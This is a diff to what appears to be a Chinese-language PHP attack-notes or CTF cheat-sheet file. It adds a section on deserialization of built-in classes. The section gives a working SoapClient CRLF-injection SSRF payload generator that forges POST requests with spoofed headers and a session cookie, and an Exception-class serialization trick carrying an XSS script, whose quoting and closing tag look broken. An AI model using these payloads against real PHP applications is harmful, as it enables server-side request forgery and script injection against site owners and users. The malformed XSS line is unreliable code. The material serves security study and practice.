@@ -374,3 +374,41 @@ chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ch
 ```
 
 分析：https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/
+
+## 原生类反序列化
+
+- SOAP
+
++CRLF SSRF
+
+```php
+<?php
+$target = "http://127.0.0.1:5555";
+$post_string = '';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=hgjf7894tb5m33n4c3ht1gu0n0'
+    );
+//这里还运用了CRLF注入攻击使得整个POST报文参数可控
+$attack = new SoapClient(null,array('location' => $target,
+                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
+                                    'uri'      => "aaab"));
+$payload = urlencode(serialize($attack));
+echo $payload;
+$c = unserialize(urldecode($payload));
+$c->b();
+```
+
+- Exception
+
+```php
+<?php
+error_reporting(0);
+#$id= "$admin";
+#show_source(__FILE__);
+#if(unserialize($id) === "$admin")
+$a = new Exception("<script>alert("xss");/script>");
+$b = serialize($a);
+$id = $b;
+print unserialize($id);
+```
